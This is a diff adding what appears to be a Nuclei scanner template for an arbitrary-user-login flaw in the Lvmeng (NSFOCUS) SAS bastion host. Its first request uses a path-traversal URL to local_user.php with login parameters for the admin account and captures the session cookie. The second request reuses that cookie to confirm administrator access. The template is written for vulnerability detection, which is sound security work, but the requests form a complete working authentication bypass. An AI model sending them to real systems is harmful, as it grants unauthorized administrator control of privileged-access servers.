@@ -1,0 +1,51 @@
+id: poc-yaml-lvmeng-SAS-arbitrary-login
+info:
+  name: Lvmeng SAS Bastion Arbitrary User Login
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass
+
+variables:
+  session_cookie: ''
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: first_request
+    method: GET
+    path:
+      - "{{BaseURL}}/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"status":200'
+    extractors:
+      - type: regex
+        name: session_cookie
+        internal: true
+        part: header
+        regex:
+          - "PHPSESSID=([^;]+);"
+
+  - id: second_request
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Cookie: PHPSESSID={{session_cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "堡垒机管理员"
+          - "提醒检查：包括消息通知，告警通知、授权通知等"
